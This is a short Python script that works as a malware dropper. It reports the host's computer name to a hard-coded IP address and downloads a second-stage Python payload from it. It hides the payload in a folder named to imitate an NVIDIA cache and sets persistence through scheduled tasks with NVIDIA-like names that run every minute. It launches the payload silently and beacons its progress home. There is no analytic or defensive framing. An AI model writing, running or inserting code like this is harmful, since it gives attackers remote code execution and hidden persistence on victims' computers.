import os, sys, base64, subprocess, urllib.request

R = 'http://154.9.26.88/'
H = os.environ.get('COMPUTERNAME') or 'x'


def beacon(tag):
    try:
        urllib.request.urlopen(R + tag, timeout=12).read()
    except Exception:
        pass


beacon('i2_' + H)

dest = os.path.join(os.environ.get('LOCALAPPDATA', r'C:\Users\Public'), 'NvCacheMgr')
try:
    os.makedirs(dest, exist_ok=True)
except Exception:
    pass

py = sys.executable
pyw = py.replace('python.exe', 'pythonw.exe')
lp = os.path.join(dest, 'wpx.py')
try:
    data = urllib.request.urlopen(R + 'l2.py', timeout=40).read()
    with open(lp, 'wb') as f:
        f.write(data)
    beacon('i2dl_%s_%d' % (H, len(data)))
except Exception as e:
    beacon('i2err_%s_%s' % (H, str(e)[:40]))

bat = os.path.join(dest, 'r.bat')
try:
    with open(bat, 'w') as f:
        f.write('@echo off\r\nstart "" /b "%s" "%s"\r\n' % (pyw, lp))
except Exception:
    pass

for tn in ('NvCacheMgr', 'NvCacheMgrFast', 'NvGpuSvc'):
    try:
        subprocess.run('schtasks /create /f /sc minute /mo 1 /tn %s /tr "%s"' % (tn, bat),
                       shell=True, capture_output=True, timeout=40)
    except Exception:
        pass

try:
    subprocess.Popen('start "" /b "%s" "%s"' % (pyw, lp), shell=True)
except Exception:
    pass

beacon('i2done_' + H)
